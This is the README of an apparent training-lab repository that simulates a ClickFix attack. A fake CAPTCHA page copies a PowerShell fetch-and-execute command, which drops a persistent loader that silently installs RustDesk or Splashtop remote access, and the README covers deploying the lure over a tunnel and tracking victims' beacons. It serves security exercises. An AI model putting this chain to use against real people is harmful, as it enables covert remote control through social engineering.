# TTX Lab — ClickFix → Modular RMM Deployment

One-command ClickFix training scenario. Victim pastes a command from a
fake CAPTCHA page → stage1 drops rmm.ps1 with logon persistence → the
loader fetches the selected tool's installer → the RMM agent lands and the
machine joins your RMM console.

Which RMM tool victims get is chosen interactively at setup time
(`./setup.sh`) from whatever tool modules exist in `ttx/rmm/`.
Ships with **Splashtop Streamer** (visible install wizard) and
**RustDesk** (silent install); see "Adding a new RMM tool" below.

## Requirements
- Docker host (any Linux box, no inbound ports needed — tunnel is outbound-only)
- An account/download for whichever RMM tool you select
- One victim Windows host (ideally WITHOUT that RMM agent already installed)

## Setup (one-time)

### Step 1: Clone the repo
    git clone https://github.com/arhodges20/ClickFix-TTX.git
    cd ClickFix-TTX

### Step 2: Pick your RMM tool

    ./setup.sh

This scans `ttx/rmm/*/manifest`, shows a numbered menu, and writes your
choice to `.env` (never committed):

    Which RMM tool should victims receive?

      1) Splashtop Streamer (MSI wizard)         [payload OK]
      2) RustDesk Host (silent)                   [PAYLOAD MISSING]

    Selection (1-2): 2

Each tool needs its payload binary placed once (the menu tells you if it's
missing, and each manifest's README line says where to get it):

- **splashtop** — my.splashtop.com → Add/deploy remote computer → deploy by
  12-digit code → Streamer MSI download. It arrives as a .zip — extract
  and save the .msi as `ttx/rmm/splashtop/streamer.msi`
- **rustdesk** — github.com/rustdesk/rustdesk/releases → Windows host exe
  (the `rustdesk-<version>-x86_64.exe` build) — save it as
  `ttx/rmm/rustdesk/rustdesk-host.exe`

The `ttx/rmm/` folder is bind-mounted into the container, so payloads are
picked up automatically — no rebuild required. Swapping a payload for the
same tool = replace the file and `docker compose restart`.

You can launch without any payload in place (lure page, clipboard copy,
and beacons all work — see "Partial testing" below), but the victim flow
will fail at the payload download step until one is there.

### Step 3: Launch

    ./setup.sh && docker compose up -d --build

    # Wait ~15 seconds for the tunnel to come up, then get the victim URL:
    docker logs ttx-lab | grep "Send victims"

    # Watch the attack chain:
    docker logs -f ttx-lab

The startup banner shows the active tool:

    TTX CLICKFIX LAB IS LIVE
    Active RMM:        rustdesk (RustDesk Host, silent)
    Send victims to:   https://<tunnel>.trycloudflare.com/ttx/

## Switching tools mid-course

Re-run the picker, then recreate the container (the tool choice is
container config, so a plain `restart` won't pick it up):

    ./setup.sh
    docker compose down && docker compose up -d --build

## Verify the payload is being served

Before handing the URL to a victim, confirm the container serves the
active tool's payload (adjust the path to the tool you picked):

    URL=$(docker logs ttx-lab | grep -oE 'https://[a-z0-9-]+\.trycloudflare\.com' | head -1)

    curl -I $URL/ttx/rmm/splashtop/streamer.msi     # or .../rustdesk/rustdesk-host.exe

Expected: `HTTP/2 200` with a sane `Content-Length`. A `404` means the
payload isn't in `ttx/rmm/<tool>/` on the host — recheck Step 2. A `200`
in the docker logs confirms each victim download.

## Partial testing (no payload, no victim needed)

You can test everything up to (but not including) the actual payload run
without placing a payload binary or using a victim machine:

1. Get the URL and open `https://<tunnel-url>/ttx/` in a browser — the fake
   CAPTCHA page should appear with a 45-second countdown
2. Click anywhere on the page, then paste into a text editor — the
   `powershell ... stage1.ps1 ... iex` command should be on your clipboard
   (DON'T run it unless you want this machine to be a victim)
3. Press `F` — the facilitator console slides in (copy stats, event log,
   editable payload)

## Victim flow

1. Victim opens https://<tunnel-url>/ttx/ (fake CAPTCHA lure)
2. Copies the command, pastes into PowerShell (elevated recommended)
3. stage1 drops rmm.ps1 (logon persistence) → loader downloads the
   selected tool's `install.ps1` → payload downloads and installs
   - **splashtop**: visible MSI wizard; user clicks through + approves the
     org connection (dcode is pre-filled)
   - **rustdesk**: fully silent (`--silent-install`); nothing to click
4. Machine appears in your RMM console → connect

## Beacon sequence (in docker logs)

Common (all tools):

    stage1-start → dropped → first-exec → persist → done →
    rmm-start-<tool> → <tool>-installed

Tool-specific extras: `splashtop-wizard-launch`, `splashtop-installed`,
`rustdesk-install-launch`, `rustdesk-installed`,
`<tool>-already-running`, `rmm-download-failed` (payload missing on the
server), `rmm-installer-fetch-failed` (install.ps1 unreachable),
`<tool>-notready` (didn't come up within 6 min).

## How tool modules work

Each folder in `ttx/rmm/<tool>/` is a self-contained module:

    ttx/rmm/<tool>/manifest     # TOOL_ID, DISPLAY_NAME, PAYLOAD_FILE,
                                # CHECK_PROCESS, README (read by setup.sh
                                # and select-rmm.sh)
    ttx/rmm/<tool>/install.ps1  # victim-side logic; dot-sourced by rmm.ps1
                                # with $Base/$BeaconUrl/$Log/Beacon() in scope
    ttx/rmm/<tool>/<payload>    # the binary the operator places

`rmm.ps1` is a thin, tool-agnostic loader: it reads the tool id injected
by `select-rmm.sh` at container start, downloads that tool's
`install.ps1` over the tunnel, and dot-sources it. Nothing in the core
pipeline (lure page, stage1.ps1, set-url.sh) knows anything about a
specific tool.

### Adding a new RMM tool

1. `mkdir ttx/rmm/<newtool>`
2. Write `ttx/rmm/<newtool>/manifest` (copy an existing one and edit)
3. Write `ttx/rmm/<newtool>/install.ps1` — copy an existing one as a
   template; keep the `$Base`-relative download URL, the `Beacon()` calls
   (prefix your beacon names with the tool id), and a process-name check
4. Place the tool's payload binary and note where to get it in the
   manifest's README line

That's it — the menu, container validation, URL rewriting, and bind-mount
all pick it up automatically. No core-script edits.

## Session lifecycle
- New URL every launch: `docker compose down && docker compose up -d --build`
- No ports published; cloudflared quick tunnel (URLs rotate per run)
- Payloads persist on the host across rebuilds — you only place them once
  per deployment (not once per session)
- Reused victims: run cleanup-victim.ps1 first (kills persistence task,
  uninstalls the RMM agent, clears Public files) — proven to produce a
  working re-run.
